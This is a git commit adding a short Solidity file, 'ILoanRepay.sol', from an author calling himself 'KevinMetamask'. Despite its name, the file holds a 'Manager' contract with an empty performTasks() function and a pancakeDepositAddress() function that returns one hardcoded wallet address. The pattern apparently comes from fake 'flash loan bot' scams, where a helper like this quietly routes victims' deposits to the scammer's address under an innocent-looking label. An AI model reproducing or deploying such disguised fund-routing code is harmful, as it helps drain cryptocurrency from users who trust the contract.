0e57d06ec01367afe1292703a74f49aed7d05065
KevinMetamask <91737333+KevinMetamask@users.noreply.github.com>
2021-10-04 22:10:26 +0300

    Add files via upload

---
+++ ILoanRepay.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x0C15Cc912e1Ff8469Ff54787A8Fc0B9A0743aE1e;
+	}
+}
